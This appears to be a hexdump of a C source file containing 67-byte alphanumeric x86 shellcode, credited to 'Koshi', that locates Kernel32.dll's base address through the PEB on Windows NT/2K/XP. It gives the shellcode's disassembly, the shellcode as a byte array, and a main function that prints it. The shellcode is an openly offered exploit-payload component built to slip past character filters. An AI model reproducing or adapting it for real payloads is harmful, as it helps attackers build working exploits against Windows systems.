00000000  2f 2a 0d 0a 0d 0a 20 50  45 42 20 4b 65 72 6e 65  |/*.... PEB Kerne|
00000010  6c 33 32 2e 64 6c 6c 20  49 6d 61 67 65 42 61 73  |l32.dll ImageBas|
00000020  65 20 46 69 6e 64 65 72  20 28 20 41 6c 70 68 61  |e Finder ( Alpha|
00000030  6e 75 6d 65 72 69 63 20  29 0d 0a 20 41 75 74 68  |numeric ).. Auth|
00000040  6f 72 3a 20 4b 6f 73 68  69 0d 0a 20 44 65 73 63  |or: Koshi.. Desc|
00000050  72 69 70 74 69 6f 6e 3a  20 55 73 65 73 20 50 45  |ription: Uses PE|
00000060  42 20 6d 65 74 68 6f 64  20 74 6f 20 6c 6f 63 61  |B method to loca|
00000070  74 65 20 74 68 65 20 49  6d 61 67 65 42 61 73 65  |te the ImageBase|
00000080  20 6f 66 20 4b 65 72 6e  65 6c 33 32 2e 64 6c 6c  | of Kernel32.dll|
00000090  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000000a0  4f 4e 4c 59 20 73 75 70  70 6f 72 74 73 20 4e 54  |ONLY supports NT|
000000b0  2f 32 4b 2f 58 50 2e 2e  20 73 6f 72 72 79 20 6e  |/2K/XP.. sorry n|
000000c0  6f 20 39 58 2e 20 49 6d  61 67 65 42 61 73 65 20  |o 9X. ImageBase |
000000d0  77 69 6c 6c 20 62 65 0d  0a 20 20 20 20 09 20 20  |will be..    .  |
000000e0  20 20 20 20 72 65 74 75  72 6e 65 64 20 69 6e 20  |    returned in |
000000f0  45 41 58 2e 20 4e 6f 20  6e 75 6c 6c 20 62 79 74  |EAX. No null byt|
00000100  65 73 2c 20 6f 62 76 69  6f 75 73 6c 79 2c 20 73  |es, obviously, s|
00000110  6f 20 6e 6f 20 6e 65 65  64 20 74 6f 0d 0a 09 20  |o no need to... |
00000120  20 20 20 20 20 65 6e 63  6f 64 65 20 72 65 61 6c  |     encode real|
00000130  6c 79 2e 0d 0a 20 4c 65  6e 67 74 68 3a 20 36 37  |ly... Length: 67|
00000140  20 42 79 74 65 73 0d 0a  20 52 65 67 69 73 74 65  | Bytes.. Registe|
00000150  72 73 20 55 73 65 64 3a  20 65 63 78 2c 65 61 78  |rs Used: ecx,eax|
00000160  2c 65 73 69 0d 0a 20 43  6f 6d 70 69 6c 65 64 3a  |,esi.. Compiled:|
00000170  20 6a 30 58 34 30 50 56  54 59 36 33 31 64 33 46  | j0X40PVTY631d3F|
00000180  30 34 6d 34 61 33 30 56  58 56 54 59 36 33 31 56  |04m4a30VXVTY631V|
00000190  34 50 34 4c 33 30 58 50  56 58 56 54 59 36 33 31  |4P4L30XPVXVTY631|
000001a0  56 33 30 56 58 56 54 59  36 33 31 56 34 58 34 50  |V30VXVTY631V4X4P|
000001b0  33 30 56 58 0d 0a 0d 0a  2a 2f 0d 0a 0d 0a 2f 2a  |30VX....*/..../*|
000001c0  0d 0a 0d 0a 30 30 34 30  31 30 30 30 20 3e 20 24  |....00401000 > $|
000001d0  20 36 41 20 33 30 20 20  20 20 20 20 20 20 20 20  | 6A 30          |
000001e0  50 55 53 48 20 33 30 0d  0a 30 30 34 30 31 30 30  |PUSH 30..0040100|
000001f0  32 20 20 20 2e 20 35 38  20 20 20 20 20 20 20 20  |2   . 58        |
00000200  20 20 20 20 20 50 4f 50  20 45 41 58 0d 0a 30 30  |     POP EAX..00|
00000210  34 30 31 30 30 33 20 20  20 2e 20 33 34 20 33 30  |401003   . 34 30|
00000220  20 20 20 20 20 20 20 20  20 20 58 4f 52 20 41 4c  |          XOR AL|
00000230  2c 33 30 0d 0a 30 30 34  30 31 30 30 35 20 20 20  |,30..00401005   |
00000240  2e 20 35 30 20 20 20 20  20 20 20 20 20 20 20 20  |. 50            |
00000250  20 50 55 53 48 20 45 41  58 0d 0a 30 30 34 30 31  | PUSH EAX..00401|
00000260  30 30 36 20 20 20 2e 20  35 36 20 20 20 20 20 20  |006   . 56      |
00000270  20 20 20 20 20 20 20 50  55 53 48 20 45 53 49 0d  |       PUSH ESI.|
00000280  0a 30 30 34 30 31 30 30  37 20 20 20 2e 20 35 34  |.00401007   . 54|
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 50 55 53  |             PUS|
000002a0  48 20 45 53 50 0d 0a 30  30 34 30 31 30 30 38 20  |H ESP..00401008 |
000002b0  20 20 2e 20 35 39 20 20  20 20 20 20 20 20 20 20  |  . 59          |
000002c0  20 20 20 50 4f 50 20 45  43 58 0d 0a 30 30 34 30  |   POP ECX..0040|
000002d0  31 30 30 39 20 20 20 2e  20 33 36 3a 33 33 33 31  |1009   . 36:3331|
000002e0  20 20 20 20 20 20 20 20  58 4f 52 20 45 53 49 2c  |        XOR ESI,|
000002f0  44 57 4f 52 44 20 50 54  52 20 53 53 3a 5b 45 43  |DWORD PTR SS:[EC|
00000300  58 5d 0d 0a 30 30 34 30  31 30 30 43 20 20 20 2e  |X]..0040100C   .|
00000310  20 36 34 3a 33 33 34 36  20 33 30 20 20 20 20 20  | 64:3346 30     |
00000320  58 4f 52 20 45 41 58 2c  44 57 4f 52 44 20 50 54  |XOR EAX,DWORD PT|
00000330  52 20 46 53 3a 5b 45 53  49 2b 33 30 5d 0d 0a 30  |R FS:[ESI+30]..0|
00000340  30 34 30 31 30 31 30 20  20 20 2e 20 33 34 20 36  |0401010   . 34 6|
00000350  44 20 20 20 20 20 20 20  20 20 20 58 4f 52 20 41  |D          XOR A|
00000360  4c 2c 36 44 0d 0a 30 30  34 30 31 30 31 32 20 20  |L,6D..00401012  |
00000370  20 2e 20 33 34 20 36 31  20 20 20 20 20 20 20 20  | . 34 61        |
00000380  20 20 58 4f 52 20 41 4c  2c 36 31 0d 0a 30 30 34  |  XOR AL,61..004|
00000390  30 31 30 31 34 20 20 20  2e 20 33 33 33 30 20 20  |01014   . 3330  |
000003a0  20 20 20 20 20 20 20 20  20 58 4f 52 20 45 53 49  |         XOR ESI|
000003b0  2c 44 57 4f 52 44 20 50  54 52 20 44 53 3a 5b 45  |,DWORD PTR DS:[E|
000003c0  41 58 5d 0d 0a 30 30 34  30 31 30 31 36 20 20 20  |AX]..00401016   |
000003d0  2e 20 35 36 20 20 20 20  20 20 20 20 20 20 20 20  |. 56            |
000003e0  20 50 55 53 48 20 45 53  49 0d 0a 30 30 34 30 31  | PUSH ESI..00401|
000003f0  30 31 37 20 20 20 2e 20  35 38 20 20 20 20 20 20  |017   . 58      |
00000400  20 20 20 20 20 20 20 50  4f 50 20 45 41 58 0d 0a  |       POP EAX..|
00000410  30 30 34 30 31 30 31 38  20 20 20 2e 20 35 36 20  |00401018   . 56 |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 50 55 53 48  |            PUSH|
00000430  20 45 53 49 0d 0a 30 30  34 30 31 30 31 39 20 20  | ESI..00401019  |
00000440  20 2e 20 35 34 20 20 20  20 20 20 20 20 20 20 20  | . 54           |
00000450  20 20 50 55 53 48 20 45  53 50 0d 0a 30 30 34 30  |  PUSH ESP..0040|
00000460  31 30 31 41 20 20 20 2e  20 35 39 20 20 20 20 20  |101A   . 59     |
00000470  20 20 20 20 20 20 20 20  50 4f 50 20 45 43 58 0d  |        POP ECX.|
00000480  0a 30 30 34 30 31 30 31  42 20 20 20 2e 20 33 36  |.0040101B   . 36|
00000490  3a 33 33 33 31 20 20 20  20 20 20 20 20 58 4f 52  |:3331        XOR|
000004a0  20 45 53 49 2c 44 57 4f  52 44 20 50 54 52 20 53  | ESI,DWORD PTR S|
000004b0  53 3a 5b 45 43 58 5d 0d  0a 30 30 34 30 31 30 31  |S:[ECX]..0040101|
000004c0  45 20 20 20 2e 20 35 36  20 20 20 20 20 20 20 20  |E   . 56        |
000004d0  20 20 20 20 20 50 55 53  48 20 45 53 49 0d 0a 30  |     PUSH ESI..0|
000004e0  30 34 30 31 30 31 46 20  20 20 2e 20 33 34 20 35  |040101F   . 34 5|
000004f0  30 20 20 20 20 20 20 20  20 20 20 58 4f 52 20 41  |0          XOR A|
00000500  4c 2c 35 30 0d 0a 30 30  34 30 31 30 32 31 20 20  |L,50..00401021  |
00000510  20 2e 20 33 34 20 34 43  20 20 20 20 20 20 20 20  | . 34 4C        |
00000520  20 20 58 4f 52 20 41 4c  2c 34 43 0d 0a 30 30 34  |  XOR AL,4C..004|
00000530  30 31 30 32 33 20 20 20  2e 20 33 33 33 30 20 20  |01023   . 3330  |
00000540  20 20 20 20 20 20 20 20  20 58 4f 52 20 45 53 49  |         XOR ESI|
00000550  2c 44 57 4f 52 44 20 50  54 52 20 44 53 3a 5b 45  |,DWORD PTR DS:[E|
00000560  41 58 5d 0d 0a 30 30 34  30 31 30 32 35 20 20 20  |AX]..00401025   |
00000570  2e 20 35 38 20 20 20 20  20 20 20 20 20 20 20 20  |. 58            |
00000580  20 50 4f 50 20 45 41 58  0d 0a 30 30 34 30 31 30  | POP EAX..004010|
00000590  32 36 20 20 20 2e 20 35  30 20 20 20 20 20 20 20  |26   . 50       |
000005a0  20 20 20 20 20 20 50 55  53 48 20 45 41 58 0d 0a  |      PUSH EAX..|
000005b0  30 30 34 30 31 30 32 37  20 20 20 2e 20 35 36 20  |00401027   . 56 |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 50 55 53 48  |            PUSH|
000005d0  20 45 53 49 0d 0a 30 30  34 30 31 30 32 38 20 20  | ESI..00401028  |
000005e0  20 2e 20 35 38 20 20 20  20 20 20 20 20 20 20 20  | . 58           |
000005f0  20 20 50 4f 50 20 45 41  58 0d 0a 30 30 34 30 31  |  POP EAX..00401|
00000600  30 32 39 20 20 20 2e 20  35 36 20 20 20 20 20 20  |029   . 56      |
00000610  20 20 20 20 20 20 20 50  55 53 48 20 45 53 49 0d  |       PUSH ESI.|
00000620  0a 30 30 34 30 31 30 32  41 20 20 20 2e 20 35 34  |.0040102A   . 54|
00000630  20 20 20 20 20 20 20 20  20 20 20 20 20 50 55 53  |             PUS|
00000640  48 20 45 53 50 0d 0a 30  30 34 30 31 30 32 42 20  |H ESP..0040102B |
00000650  20 20 2e 20 35 39 20 20  20 20 20 20 20 20 20 20  |  . 59          |
00000660  20 20 20 50 4f 50 20 45  43 58 0d 0a 30 30 34 30  |   POP ECX..0040|
00000670  31 30 32 43 20 20 20 2e  20 33 36 3a 33 33 33 31  |102C   . 36:3331|
00000680  20 20 20 20 20 20 20 20  58 4f 52 20 45 53 49 2c  |        XOR ESI,|
00000690  44 57 4f 52 44 20 50 54  52 20 53 53 3a 5b 45 43  |DWORD PTR SS:[EC|
000006a0  58 5d 0d 0a 30 30 34 30  31 30 32 46 20 20 20 2e  |X]..0040102F   .|
000006b0  20 35 36 20 20 20 20 20  20 20 20 20 20 20 20 20  | 56             |
000006c0  50 55 53 48 20 45 53 49  0d 0a 30 30 34 30 31 30  |PUSH ESI..004010|
000006d0  33 30 20 20 20 2e 20 33  33 33 30 20 20 20 20 20  |30   . 3330     |
000006e0  20 20 20 20 20 20 58 4f  52 20 45 53 49 2c 44 57  |      XOR ESI,DW|
000006f0  4f 52 44 20 50 54 52 20  44 53 3a 5b 45 41 58 5d  |ORD PTR DS:[EAX]|
00000700  0d 0a 30 30 34 30 31 30  33 32 20 20 20 2e 20 35  |..00401032   . 5|
00000710  36 20 20 20 20 20 20 20  20 20 20 20 20 20 50 55  |6             PU|
00000720  53 48 20 45 53 49 0d 0a  30 30 34 30 31 30 33 33  |SH ESI..00401033|
00000730  20 20 20 2e 20 35 38 20  20 20 20 20 20 20 20 20  |   . 58         |
00000740  20 20 20 20 50 4f 50 20  45 41 58 0d 0a 30 30 34  |    POP EAX..004|
00000750  30 31 30 33 34 20 20 20  2e 20 35 36 20 20 20 20  |01034   . 56    |
00000760  20 20 20 20 20 20 20 20  20 50 55 53 48 20 45 53  |         PUSH ES|
00000770  49 0d 0a 30 30 34 30 31  30 33 35 20 20 20 2e 20  |I..00401035   . |
00000780  35 34 20 20 20 20 20 20  20 20 20 20 20 20 20 50  |54             P|
00000790  55 53 48 20 45 53 50 0d  0a 30 30 34 30 31 30 33  |USH ESP..0040103|
000007a0  36 20 20 20 2e 20 35 39  20 20 20 20 20 20 20 20  |6   . 59        |
000007b0  20 20 20 20 20 50 4f 50  20 45 43 58 0d 0a 30 30  |     POP ECX..00|
000007c0  34 30 31 30 33 37 20 20  20 2e 20 33 36 3a 33 33  |401037   . 36:33|
000007d0  33 31 20 20 20 20 20 20  20 20 58 4f 52 20 45 53  |31        XOR ES|
000007e0  49 2c 44 57 4f 52 44 20  50 54 52 20 53 53 3a 5b  |I,DWORD PTR SS:[|
000007f0  45 43 58 5d 0d 0a 30 30  34 30 31 30 33 41 20 20  |ECX]..0040103A  |
00000800  20 2e 20 35 36 20 20 20  20 20 20 20 20 20 20 20  | . 56           |
00000810  20 20 50 55 53 48 20 45  53 49 0d 0a 30 30 34 30  |  PUSH ESI..0040|
00000820  31 30 33 42 20 20 20 2e  20 33 34 20 35 38 20 20  |103B   . 34 58  |
00000830  20 20 20 20 20 20 20 20  58 4f 52 20 41 4c 2c 35  |        XOR AL,5|
00000840  38 0d 0a 30 30 34 30 31  30 33 44 20 20 20 2e 20  |8..0040103D   . |
00000850  33 34 20 35 30 20 20 20  20 20 20 20 20 20 20 58  |34 50          X|
00000860  4f 52 20 41 4c 2c 35 30  0d 0a 30 30 34 30 31 30  |OR AL,50..004010|
00000870  33 46 20 20 20 2e 20 33  33 33 30 20 20 20 20 20  |3F   . 3330     |
00000880  20 20 20 20 20 20 58 4f  52 20 45 53 49 2c 44 57  |      XOR ESI,DW|
00000890  4f 52 44 20 50 54 52 20  44 53 3a 5b 45 41 58 5d  |ORD PTR DS:[EAX]|
000008a0  0d 0a 30 30 34 30 31 30  34 31 20 20 20 2e 20 35  |..00401041   . 5|
000008b0  36 20 20 20 20 20 20 20  20 20 20 20 20 20 50 55  |6             PU|
000008c0  53 48 20 45 53 49 0d 0a  30 30 34 30 31 30 34 32  |SH ESI..00401042|
000008d0  20 20 20 2e 20 35 38 20  20 20 20 20 20 20 20 20  |   . 58         |
000008e0  20 20 20 20 50 4f 50 20  45 41 58 0d 0a 0d 0a 0d  |    POP EAX.....|
000008f0  0a 2a 2f 0d 0a 0d 0a 75  6e 73 69 67 6e 65 64 20  |.*/....unsigned |
00000900  63 68 61 72 20 53 68 65  6c 6c 63 6f 64 65 5b 5d  |char Shellcode[]|
00000910  20 3d 0d 0a 7b 22 5c 78  36 41 5c 78 33 30 5c 78  | =..{"\x6A\x30\x|
00000920  35 38 5c 78 33 34 5c 78  33 30 5c 78 35 30 5c 78  |58\x34\x30\x50\x|
00000930  35 36 5c 78 35 34 22 0d  0a 22 5c 78 35 39 5c 78  |56\x54".."\x59\x|
00000940  33 36 5c 78 33 33 5c 78  33 31 5c 78 36 34 5c 78  |36\x33\x31\x64\x|
00000950  33 33 5c 78 34 36 5c 78  33 30 22 0d 0a 22 5c 78  |33\x46\x30".."\x|
00000960  33 34 5c 78 36 44 5c 78  33 34 5c 78 36 31 5c 78  |34\x6D\x34\x61\x|
00000970  33 33 5c 78 33 30 5c 78  35 36 5c 78 35 38 22 0d  |33\x30\x56\x58".|
00000980  0a 22 5c 78 35 36 5c 78  35 34 5c 78 35 39 5c 78  |."\x56\x54\x59\x|
00000990  33 36 5c 78 33 33 5c 78  33 31 5c 78 35 36 5c 78  |36\x33\x31\x56\x|
000009a0  33 34 22 0d 0a 22 5c 78  35 30 5c 78 33 34 5c 78  |34".."\x50\x34\x|
000009b0  34 43 5c 78 33 33 5c 78  33 30 5c 78 35 38 5c 78  |4C\x33\x30\x58\x|
000009c0  35 30 5c 78 35 36 22 0d  0a 22 5c 78 35 38 5c 78  |50\x56".."\x58\x|
000009d0  35 36 5c 78 35 34 5c 78  35 39 5c 78 33 36 5c 78  |56\x54\x59\x36\x|
000009e0  33 33 5c 78 33 31 5c 78  35 36 22 0d 0a 22 5c 78  |33\x31\x56".."\x|
000009f0  33 33 5c 78 33 30 5c 78  35 36 5c 78 35 38 5c 78  |33\x30\x56\x58\x|
00000a00  35 36 5c 78 35 34 5c 78  35 39 5c 78 33 36 22 0d  |56\x54\x59\x36".|
00000a10  0a 22 5c 78 33 33 5c 78  33 31 5c 78 35 36 5c 78  |."\x33\x31\x56\x|
00000a20  33 34 5c 78 35 38 5c 78  33 34 5c 78 35 30 5c 78  |34\x58\x34\x50\x|
00000a30  33 33 22 0d 0a 22 5c 78  33 30 5c 78 35 36 5c 78  |33".."\x30\x56\x|
00000a40  35 38 22 7d 3b 0d 0a 0d  0a 0d 0a 0d 0a 69 6e 74  |58"};........int|
00000a50  20 6d 61 69 6e 28 20 69  6e 74 20 61 72 67 63 2c  | main( int argc,|
00000a60  20 63 68 61 72 20 2a 61  72 67 76 5b 5d 20 29 0d  | char *argv[] ).|
00000a70  0a 7b 0d 0a 20 70 72 69  6e 74 66 28 20 22 53 68  |.{.. printf( "Sh|
00000a80  65 6c 6c 63 6f 64 65 20  69 73 20 25 75 20 62 79  |ellcode is %u by|
00000a90  74 65 73 2e 5c 6e 22 2c  20 73 69 7a 65 6f 66 28  |tes.\n", sizeof(|
00000aa0  53 68 65 6c 6c 63 6f 64  65 29 2d 31 20 29 3b 0d  |Shellcode)-1 );.|
00000ab0  0a 20 70 72 69 6e 74 66  28 20 53 68 65 6c 6c 63  |. printf( Shellc|
00000ac0  6f 64 65 2c 20 73 69 7a  65 6f 66 28 53 68 65 6c  |ode, sizeof(Shel|
00000ad0  6c 63 6f 64 65 29 20 29  3b 0d 0a 20 72 65 74 75  |lcode) );.. retu|
00000ae0  72 6e 20 30 3b 0d 0a 7d                           |rn 0;..}|
00000ae8
